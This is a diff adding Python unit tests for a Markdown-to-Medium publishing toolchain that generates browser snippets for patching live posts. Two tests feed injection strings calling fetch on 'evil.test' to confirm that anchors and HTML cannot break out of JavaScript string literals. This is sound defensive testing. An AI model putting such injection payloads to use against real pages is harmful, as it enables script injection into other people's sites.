@@ -12,6 +12,7 @@ at the end of every run.
 """
 
 import base64
+import glob
 import json
 import os
 import re
@@ -27,6 +28,7 @@ sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 import chrome_cookies
 import md2medium
 import medium_js
+import medium_patch
 import verify_draft
 
 
@@ -440,7 +442,7 @@ class TestSnippets(unittest.TestCase):
         # which throws SyntaxError at eval time, not at generation time. It was
         # image_js that hit it, so every snippet has to be checked, not most.
         for label, js in self.all_snippets().items():
-            declared = re.findall(r"\bconst\s+([A-Za-z_$][\w$]*)", js)
+            declared = const_names(js)
             dupes = {n for n in declared if declared.count(n) > 1}
             self.assertEqual(dupes, set(),
                              "%s redeclares %s:\n%s" % (label, sorted(dupes), js))
@@ -562,6 +564,27 @@ class TestProfiles(unittest.TestCase):
 
 
 TOOLS = os.path.dirname(os.path.abspath(__file__))
+
+
+
+def const_names(js):
+    r"""Every name a `const` binds, including 2nd declarators and destructuring.
+
+    `re.findall(r"const\s+(\w+)")` sees only the first declarator, so it is
+    blind to `const a = .., b = ..` and to `const [node, at] = ..` — which is
+    most of what these snippets actually declare. A guard that cannot see the
+    collision it exists to catch is worse than no guard.
+    """
+    names = []
+    for line in js.splitlines():
+        m = re.search(r"\bconst\s+(.*)$", line)
+        if not m:
+            continue
+        rest = m.group(1)
+        for group in re.findall(r"\[([^\]]*)\]\s*=", rest):
+            names += re.findall(r"[A-Za-z_$][\w$]*", group)
+        names += re.findall(r"(?:^|,)\s*([A-Za-z_$][\w$]*)\s*=(?!=)", rest)
+    return names
 
 
 def run_tool(*args):
@@ -688,6 +711,483 @@ class TestMediumJsCLI(unittest.TestCase):
         out = run_tool(os.path.join(TOOLS, "medium_js.py"), "slot", "a.png")
         self.assertEqual(out.returncode, 0, out.stderr)
         self.assertIn("IMGSLOT-a.png-ENDSLOT", out.stdout)
+
+
+
+
+class TestPatchFragment(unittest.TestCase):
+    """fragment_html has to agree with the converter that built the live post.
+
+    A patch is pasted next to grafs produced by md2medium, so any divergence in
+    block mapping shows up as one subheading rendering a different size from its
+    neighbours — visible to readers, invisible in the diff.
+    """
+
+    def test_subheading_maps_to_h4_like_the_body_converter(self):
+        # ### is graf--h4 in the body; a patch emitting <h3> would render big.
+        self.assertIn("<h4>系列文章</h4>",
+                      medium_patch.fragment_html("### 系列文章\n"))
+
+    def test_section_heading_maps_to_h2_like_the_body_converter(self):
+        self.assertIn("<h2>", medium_patch.fragment_html("## 十二、結語\n"))
+
+    def test_throwaway_title_does_not_leak_into_the_output(self):
+        # fragment_html prepends "# _" to satisfy convert(); if that ever landed
+        # in html the patch would paste a stray heading into the article.
+        out = medium_patch.fragment_html("一般段落\n")
+        self.assertNotIn("_", out)
+        self.assertEqual(out, "<p>一般段落</p>")
+
+    def test_links_and_ordered_lists_survive(self):
+        out = medium_patch.fragment_html(
+            "1. [組織篇](https://example.com/a)—編制\n2. 技術篇（尚未發布）\n")
+        self.assertIn('<a href="https://example.com/a">組織篇</a>', out)
+        self.assertEqual(out.count("<li>"), 2)
+
+    def test_blank_line_in_a_code_block_stays_one_block(self):
+        # Same rule as the body: a split <pre> becomes two boxes in the editor.
+        out = medium_patch.fragment_html("```text\na\n\nb\n```\n")
+        self.assertEqual(out.count("<pre>"), 1)
+
+
+class TestPatchSnippets(unittest.TestCase):
+    def snippets(self):
+        return {
+            "find": medium_patch.find_js("anchor"),
+            "replace": medium_patch.replace_js("a", "b", "<p>x</p>"),
+            "dry": medium_patch.replace_js("a", "b", "<p>x</p>", dry=True),
+        }
+
+    def test_every_snippet_is_a_self_invoking_expression(self):
+        for label, js in self.snippets().items():
+            self.assertTrue(js.strip().startswith("(() =>"), label)
+            self.assertTrue(js.strip().endswith(")()"), label)
+
+    def test_no_duplicate_const_declarations(self):
+        # The shared NORMALISE/PICK blocks and the callers all declare names;
+        # a collision is a SyntaxError at eval time, not at generation time.
+        for label, js in self.snippets().items():
+            declared = const_names(js)
+            dupes = {n for n in declared if declared.count(n) > 1}
+            self.assertEqual(dupes, set(),
+                             "%s redeclares %s" % (label, sorted(dupes)))
+
+    def test_dry_run_never_dispatches_a_paste(self):
+        # The whole point of --dry is that it is safe to fire at a live post.
+        self.assertNotIn("dispatchEvent",
+                         medium_patch.replace_js("a", "b", "<p>x</p>", dry=True)
+                         .split("if (true)")[0] + "")
+        dry = medium_patch.replace_js("a", "b", "<p>x</p>", dry=True)
+        before_guard, after_guard = dry.split("if (true) return", 1)
+        self.assertNotIn("dispatchEvent", before_guard)
+
+    def test_live_run_does_dispatch_a_paste(self):
+        self.assertIn("dispatchEvent", medium_patch.replace_js("a", "b", "<p>x</p>"))
+        self.assertIn("if (false) return",
+                      medium_patch.replace_js("a", "b", "<p>x</p>"))
+
+    def test_refuses_an_ambiguous_or_missing_anchor(self):
+        js = medium_patch.replace_js("a", "b", "<p>x</p>")
+        self.assertIn("a.length !== 1", js)
+        self.assertIn("b.length !== 1", js)
+
+    def test_refuses_a_backwards_range(self):
+        self.assertIn("b[0] < a[0]", medium_patch.replace_js("a", "b", "<p>x</p>"))
+
+    def test_anchor_cannot_break_out_of_the_js_string_literal(self):
+        # Anchors come from argv and are not validated anywhere.
+        evil = 'x");fetch("https://evil.test");//'
+        js = medium_patch.replace_js(evil, "b", "<p>x</p>")
+        literal = js.split("const a = pick(")[1].split("), b = pick(")[0]
+        self.assertEqual(json.loads(literal), evil)
+
+    def test_replacement_html_cannot_break_out_of_the_js_string_literal(self):
+        evil = '</p>";fetch("https://evil.test");//'
+        js = medium_patch.replace_js("a", "b", evil)
+        literal = js.split("const HTML = ")[1].split(";\n")[0]
+        self.assertEqual(json.loads(literal), evil)
+
+    def test_a_percent_sign_in_the_replacement_survives_formatting(self):
+        # The snippet is built with %-formatting; a stray % in a URL-encoded
+        # Medium link would blow up or corrupt the payload if interpolated.
+        html = '<a href="https://x.test/%E5%88%A5">別</a>'
+        js = medium_patch.replace_js("a", "b", html)
+        literal = js.split("const HTML = ")[1].split(";\n")[0]
+        self.assertEqual(json.loads(literal), html)
+
+
+class TestMediumPatchCLI(unittest.TestCase):
+    def test_unknown_snippet_name_exits(self):
+        out = run_tool(os.path.join(TOOLS, "medium_patch.py"), "bogus", "x")
+        self.assertNotEqual(out.returncode, 0)
+        self.assertIn("unknown snippet", out.stderr)
+
+    def test_replace_requires_all_three_arguments(self):
+        out = run_tool(os.path.join(TOOLS, "medium_patch.py"), "replace", "a")
+        self.assertNotEqual(out.returncode, 0)
+
+    def test_html_subcommand_converts_a_file(self):
+        d = tempfile.TemporaryDirectory()
+        self.addCleanup(d.cleanup)
+        frag = os.path.join(d.name, "f.md")
+        with open(frag, "w", encoding="utf-8") as fh:
+            fh.write("### 系列文章\n")
+        out = run_tool(os.path.join(TOOLS, "medium_patch.py"), "html", frag)
+        self.assertEqual(out.returncode, 0)
+        self.assertEqual(out.stdout.strip(), "<h4>系列文章</h4>")
+
+
+class TestPatchImageSnippets(unittest.TestCase):
+    def png(self):
+        d = tempfile.TemporaryDirectory()
+        self.addCleanup(d.cleanup)
+        path = os.path.join(d.name, "table-04.png")
+        with open(path, "wb") as fh:
+            fh.write(b"\x89PNG\r\n\x1a\nnot-a-real-png")
+        return path
+
+    def test_image_snippet_embeds_decodable_bytes(self):
+        path = self.png()
+        with open(path, "rb") as fh:
+            raw = fh.read()
+        js = medium_patch.image_js("anchor", path)
+        encoded = js.split("const bin = atob(")[1].split(");")[0]
+        self.assertEqual(base64.b64decode(json.loads(encoded)), raw)
+
+    def test_image_snippet_uses_the_basename_not_the_temp_path(self):
+        # The File name becomes the upload's filename; a temp path would leak
+        # the whole directory into Medium.
+        js = medium_patch.image_js("anchor", self.png())
+        self.assertIn(json.dumps("table-04.png"), js)
+        self.assertNotIn(tempfile.gettempdir(), js.split("const file")[1][:200])
+
+    def test_image_and_drop_refuse_an_ambiguous_anchor(self):
+        self.assertIn("hit.length !== 1", medium_patch.image_js("a", self.png()))
+        self.assertIn("hits.length !== 1", medium_patch.drop_js("a.png"))
+
+    def test_drop_only_selects_and_never_presses(self):
+        # medium_draft.sh learned this the hard way: the snippet must confirm
+        # what is selected and leave the Backspace to the caller, so a miss
+        # cannot eat article content.
+        js = medium_patch.drop_js("a.png")
+        self.assertNotIn("Backspace", js)
+        self.assertIn("selected", js)
+
+    def test_drop_reports_which_figure_it_selected(self):
+        js = medium_patch.drop_js("a.png")
+        self.assertIn("split('/').pop()", js)
+
+    def test_image_and_drop_are_self_invoking_expressions(self):
+        for label, js in {"image": medium_patch.image_js("a", self.png()),
+                          "drop": medium_patch.drop_js("a.png")}.items():
+            self.assertTrue(js.strip().startswith("(() =>"), label)
+            self.assertTrue(js.strip().endswith(")()"), label)
+
+    def test_image_and_drop_have_no_duplicate_const_declarations(self):
+        for label, js in {"image": medium_patch.image_js("a", self.png()),
+                          "drop": medium_patch.drop_js("a.png")}.items():
+            declared = const_names(js)
+            dupes = {n for n in declared if declared.count(n) > 1}
+            self.assertEqual(dupes, set(), "%s redeclares %s" % (label, sorted(dupes)))
+
+
+class TestPatchAnchorNormalisation(unittest.TestCase):
+    """The anchor normaliser, exercised through the patterns actually shipped.
+
+    There is no browser here, so the JS cannot be run — but the regexes can be
+    lifted out of the emitted snippet and applied with Python's `re`, which has
+    the same semantics for these three character classes. That keeps the test
+    honest: it fails if someone edits the pattern in medium_patch, not if
+    someone edits a copy of it in the test.
+    """
+
+    def norm(self, text):
+        rules = re.findall(r"\.replace\(/(.+?)/g, '(.*?)'\)", medium_patch.NORMALISE)
+        # Deliberately not a count assertion: the rules may be merged or split
+        # without changing behaviour, and pinning the number would make every
+        # test here fail on the guard instead of on what it actually checks.
+        self.assertTrue(rules, "no replace() rules found in NORMALISE")
+        for pattern, repl in rules:
+            text = re.sub(pattern.encode().decode("unicode_escape"),
+                          repl.encode().decode("unicode_escape"), text)
+        return text.strip()
+
+    def test_hair_spaced_em_dash_matches_an_anchor_written_with_spaces(self):
+        # The real miss: Medium renders "A — B" as "A<hair>—<hair>B" with no
+        # ordinary spaces, so an anchor copied from article.md found nothing.
+        rendered = "Stack Overflow\u200a\u2014\u200aAgents on a leash"
+        authored = "Stack Overflow \u2014 Agents on a leash"
+        self.assertEqual(self.norm(rendered), self.norm(authored))
+
+    def test_double_em_dash_in_a_title_also_lines_up(self):
+        rendered = "Harness \u200a\u2014\u200a \u200a\u2014\u200a \u628a\u7cfb\u7d71"
+        authored = "Harness\u2014\u2014\u628a\u7cfb\u7d71"
+        self.assertEqual(self.norm(rendered), self.norm(authored))
+
+    def test_nbsp_and_bom_do_not_defeat_an_anchor(self):
+        self.assertEqual(self.norm("\ufeffAGENTS.md\u00a0\uff1a\u5beb\u5c0d"),
+                         self.norm("AGENTS.md\uff1a\u5beb\u5c0d"))
+
+    def test_ordinary_word_spacing_is_still_significant(self):
+        # Collapsing runs is fine; deleting spaces entirely would make anchors
+        # match text that does not actually read the same.
+        self.assertNotEqual(self.norm("make test FILTER"), self.norm("maketestFILTER"))
+
+    def test_runs_of_whitespace_collapse_to_one(self):
+        self.assertEqual(self.norm("a\n\n  b"), self.norm("a b"))
+
+
+class TestDoubleDashCheck(unittest.TestCase):
+    """`——` must never reach Medium: it renders as `— —`, a gap mid-stroke.
+
+    This has to be caught at conversion, because nothing downstream can see it.
+    verify_draft.py deliberately folds em-dash spacing away so Medium's hair
+    spaces do not read as a paste failure — which means a double dash sails
+    through every later check and only shows up to readers.
+    """
+
+    def test_double_dash_is_rejected(self):
+        with self.assertRaises(SystemExit) as cm:
+            md2medium.convert("# T\n\n\u4e00\u2014\u2014\u4e8c\n")
+        self.assertIn("——", str(cm.exception))
+
+    def test_the_line_number_accounts_for_the_stripped_checklist(self):
+        # Every real publish/medium-paste.md opens with an HTML comment block
+        # that convert() removes before numbering. Reporting the post-strip
+        # index sends the author to the wrong line of the file they must edit.
+        src = "<!--\nchecklist\nmore\n-->\n\n# T\n\nfine\n\n\u4e00\u2014\u2014\u4e8c\n"
+        self.assertEqual(src.split("\n").index("\u4e00\u2014\u2014\u4e8c") + 1, 10)
+        with self.assertRaises(SystemExit) as cm:
+            md2medium.convert(src)
+        self.assertIn("line 10", str(cm.exception))
+
+    def test_the_error_points_at_the_offending_line(self):
+        with self.assertRaises(SystemExit) as cm:
+            md2medium.convert("# T\n\nfine\n\n\u4e00\u2014\u2014\u4e8c\n")
+        msg = str(cm.exception)
+        self.assertIn("line 5", msg)
+        self.assertIn("\u4e00\u2014\u2014\u4e8c", msg)
+
+    def test_a_single_em_dash_is_left_alone(self):
+        self.assertEqual(md2medium.convert("# T\n\n\u4e00\u2014\u4e8c\n")["html"],
+                         "<p>\u4e00\u2014\u4e8c</p>")
+
+    def test_en_dash_is_not_mistaken_for_it(self):
+        # 2014-2016 style ranges use U+2013 and are fine.
+        self.assertEqual(md2medium.convert("# T\n\n2014\u20132016\n")["html"],
+                         "<p>2014\u20132016</p>")
+
+    def test_two_em_dashes_in_one_line_but_apart_are_fine(self):
+        out = md2medium.convert("# T\n\n\u4e00\u2014\u4e8c\u3001\u4e09\u2014\u56db\n")["html"]
+        self.assertEqual(out, "<p>\u4e00\u2014\u4e8c\u3001\u4e09\u2014\u56db</p>")
+
+    def test_a_run_of_three_is_rejected_too(self):
+        with self.assertRaises(SystemExit):
+            md2medium.convert("# T\n\n\u4e00\u2014\u2014\u2014\u4e8c\n")
+
+    def test_a_code_block_is_exempt(self):
+        # Medium adds no hair spaces inside a <pre>, so `——` renders there
+        # exactly as written and is the correct CJK dash. Flagging it would
+        # force the AGENTS.md sample to use punctuation it is not teaching.
+        out = md2medium.convert("# T\n\n```text\na\u2014\u2014b\n```\n")["html"]
+        self.assertEqual(out, "<pre><code>a\u2014\u2014b</code></pre>")
+
+    def test_the_exemption_ends_with_the_fence(self):
+        # The obvious way to get the exemption wrong is to latch it on and
+        # stop checking the rest of the file.
+        with self.assertRaises(SystemExit) as cm:
+            md2medium.convert("# T\n\n```text\na\u2014\u2014b\n```\n\n\u4e00\u2014\u2014\u4e8c\n")
+        self.assertIn("\u4e00\u2014\u2014\u4e8c", str(cm.exception))
+
+    def test_the_fence_scan_agrees_with_the_converter(self):
+        # double_dash_lines is what the repo sweep below uses; if it drifted
+        # from the fence rules convert() applies, the sweep would pass on a
+        # file convert() rejects.
+        lines = ["prose ok", "```text", "a\u2014\u2014b", "```", "\u4e00\u2014\u2014\u4e8c"]
+        self.assertEqual([k for k, _ in md2medium.double_dash_lines(lines)], [5])
+
+    def test_every_shipped_article_is_clean(self):
+        # The regression guard for the actual fix: all four articles were
+        # rewritten from —— to —, and every file of each pack must stay that way.
+        # Globbed rather than a fixed list of two names: the English editions
+        # arrived as article.en.md + publish/en/medium-paste.md and would have
+        # sat outside a hardcoded pair, unchecked.
+        root = os.path.dirname(TOOLS)
+        found = []
+        for pattern in ("*/article*.md", "*/publish/medium-paste.md",
+                        "*/publish/*/medium-paste.md"):
+            for path in sorted(glob.glob(os.path.join(root, pattern))):
+                with open(path, encoding="utf-8") as fh:
+                    lines = fh.read().split("\n")
+                # Same fence-aware scan convert() gates on, not a second copy
+                # of the rule: code blocks legitimately keep their `——`.
+                for k, _ in md2medium.double_dash_lines(lines):
+                    found.append("%s:%d" % (os.path.relpath(path, root), k))
+        self.assertEqual(found, [])
+
+    def test_the_guard_actually_looks_at_the_english_packs(self):
+        # A glob that silently matches nothing would make the test above pass
+        # forever. Assert the English editions are really in its scope.
+        root = os.path.dirname(TOOLS)
+        seen = [os.path.relpath(p, root) for p in glob.glob(os.path.join(root, "*/article*.md"))]
+        self.assertTrue([p for p in seen if p.endswith("article.en.md")],
+                        "no article.en.md matched; the guard would not cover them")
+        seen_paste = glob.glob(os.path.join(root, "*/publish/*/medium-paste.md"))
+        self.assertTrue(seen_paste, "no publish/<lang>/medium-paste.md matched")
+
+
+class TestPatchSubst(unittest.TestCase):
+    def js(self):
+        return medium_patch.subst_js("\u2014\u2014", "\u2014")
+
+    def test_is_a_self_invoking_expression(self):
+        js = self.js()
+        self.assertTrue(js.strip().startswith("(() =>"))
+        self.assertTrue(js.strip().endswith(")()"))
+
+    def test_no_duplicate_const_declarations(self):
+        declared = const_names(self.js())
+        dupes = {n for n in declared if declared.count(n) > 1}
+        self.assertEqual(dupes, set(), "redeclares %s" % sorted(dupes))
+
+    def test_both_strings_are_embedded_as_json(self):
+        js = medium_patch.subst_js("a\"b", "c\\d")
+        self.assertIn(json.dumps("a\"b"), js)
+        self.assertIn(json.dumps("c\\d"), js)
+
+    def test_it_verifies_the_selection_before_pasting(self):
+        # A range built from a stale offset would otherwise replace whatever
+        # happens to sit there. Same reason drop_js reports what it selected.
+        self.assertIn("sel.toString() !== OLD", self.js())
+
+    def test_the_success_path_recounts_what_is_left(self):
+        # `remaining` in the no-hit early return is not enough: the caller
+        # loops on the value returned *after* a substitution, so asserting on
+        # the snippet as a whole passes even if that recount is deleted.
+        after_early_return = self.js().split("const [node, at] = hits[0];", 1)[1]
+        self.assertIn("remaining: walk().length", after_early_return)
+
+    def test_a_literal_miss_is_not_reported_as_a_clean_finish(self):
+        # Medium stores `——` as HAIR — HAIR — SPACE, so the literal never
+        # matches in prose and a bare `remaining: 0` would say "done" on an
+        # article that still has every one of them.
+        early = self.js().split("const [node, at] = hits[0];", 1)[0]
+        # Not just the word "rendered": the count has to be DERIVED from the
+        # invisible-stripped text, or a constant 0 would satisfy the assertion
+        # and restore exactly the false clean this exists to prevent.
+        self.assertIn("strip(raw).split(bare).length - 1", early)
+        self.assertIn("\\u200A", early)
+
+    def test_it_flags_a_match_split_across_text_nodes(self):
+        # Reporting remaining:0 while innerText still shows the string would
+        # look like a clean finish and silently leave the article wrong.
+        self.assertIn("split", self.js())
+
+    def test_it_replaces_only_one_occurrence_per_call(self):
+        self.assertIn("hits[0]", self.js())
+        self.assertIn("replaced: 1", self.js())
+
+
+class TestConstNameExtractor(unittest.TestCase):
+    """Guards the guard: a blind extractor makes every dupe check vacuous."""
+
+    def test_sees_a_second_declarator(self):
+        self.assertEqual(const_names("  const a = f(), b = g();"), ["a", "b"])
+
+    def test_sees_destructured_bindings(self):
+        self.assertEqual(const_names("  const [node, at] = hits[0];"), ["node", "at"])
+
+    def test_does_not_invent_names_from_arrow_params_or_calls(self):
+        self.assertEqual(const_names("  const norm = s => s.replace(/x/g, '');"), ["norm"])
+
+    def test_it_catches_a_collision_the_old_regex_missed(self):
+        js = medium_patch.replace_js("a", "b", "<p>x</p>") + "\n  const b = 1;"
+        names = const_names(js)
+        self.assertGreater(names.count("b"), 1)
+
+
+class TestPatchCLI(unittest.TestCase):
+    """The CLI is the surface an operator actually points at a published post."""
+
+    def files(self):
+        d = tempfile.TemporaryDirectory()
+        self.addCleanup(d.cleanup)
+        html = os.path.join(d.name, "f.html")
+        with open(html, "w", encoding="utf-8") as fh:
+            fh.write("<p>x</p>")
+        png = os.path.join(d.name, "a.png")
+        with open(png, "wb") as fh:
+            fh.write(b"\x89PNG\r\n\x1a\n")
+        return html, png
+
+    def patch(self, *args):
+        return run_tool(os.path.join(TOOLS, "medium_patch.py"), *args)
+
+    def test_the_dry_flag_reaches_the_generated_snippet(self):
+        # dry is read straight off sys.argv; without this the flag can be
+        # broken while every unit test still passes, and --dry is the only
+        # rehearsal an operator gets before editing a live article.
+        html, _ = self.files()
+        out = self.patch("replace", "a", "b", html, "--dry")
+        self.assertEqual(out.returncode, 0, out.stderr)
+        self.assertIn("if (true) return", out.stdout)
+        self.assertNotIn("dispatchEvent", out.stdout.split("if (true) return")[0])
+
+    def test_without_the_flag_the_snippet_is_live(self):
+        html, _ = self.files()
+        out = self.patch("replace", "a", "b", html)
+        self.assertEqual(out.returncode, 0, out.stderr)
+        self.assertIn("if (false) return", out.stdout)
+        self.assertIn("dispatchEvent", out.stdout)
+
+    def test_dry_is_refused_for_subcommands_that_do_not_honour_it(self):
+        # Silently ignoring it would run the live action for someone who
+        # believed they had asked for a rehearsal.
+        for args in (["subst", "a", "b"], ["find", "a"], ["drop", "a.png"]):
+            out = self.patch(*args, "--dry")
+            self.assertNotEqual(out.returncode, 0, args)
+            self.assertIn("--dry only applies to replace", out.stderr)
+
+    def test_find_and_drop_carry_their_argument(self):
+        out = self.patch("find", "導言")
+        self.assertEqual(out.returncode, 0, out.stderr)
+        self.assertIn(json.dumps("導言", ensure_ascii=False), out.stdout)
+        out = self.patch("drop", "table-04.png")
+        self.assertEqual(out.returncode, 0, out.stderr)
+        self.assertIn("table-04.png", out.stdout)
+
+    def test_subst_emits_a_snippet_that_reports_remaining(self):
+        out = self.patch("subst", "——", "—")
+        self.assertEqual(out.returncode, 0, out.stderr)
+        self.assertIn("remaining", out.stdout)
+
+    def test_image_embeds_the_file(self):
+        _, png = self.files()
+        out = self.patch("image", "導言", png)
+        self.assertEqual(out.returncode, 0, out.stderr)
+        self.assertIn("atob(", out.stdout)
+
+    def test_image_refuses_a_file_that_is_not_a_png(self):
+        # The snippet hardcodes image/png and uploads to a public CDN; a wrong
+        # path would otherwise post arbitrary local bytes to the article.
+        d = tempfile.TemporaryDirectory()
+        self.addCleanup(d.cleanup)
+        bogus = os.path.join(d.name, "cookies.json")
+        with open(bogus, "w", encoding="utf-8") as fh:
+            fh.write('{"sid":"SECRET"}')
+        out = self.patch("image", "導言", bogus)
+        self.assertNotEqual(out.returncode, 0)
+        self.assertIn("not a PNG", out.stderr)
+        self.assertNotIn("SECRET", out.stdout)
+
+    def test_no_arguments_exits_nonzero(self):
+        out = self.patch()
+        self.assertNotEqual(out.returncode, 0)
+
+    def test_each_subcommand_rejects_a_wrong_argument_count(self):
+        for args in (["find"], ["find", "a", "b"], ["drop"], ["subst", "a"],
+                     ["html"], ["replace", "a"]):
+            self.assertNotEqual(self.patch(*args).returncode, 0, "%s" % args)
 
 
 if __name__ == "__main__":
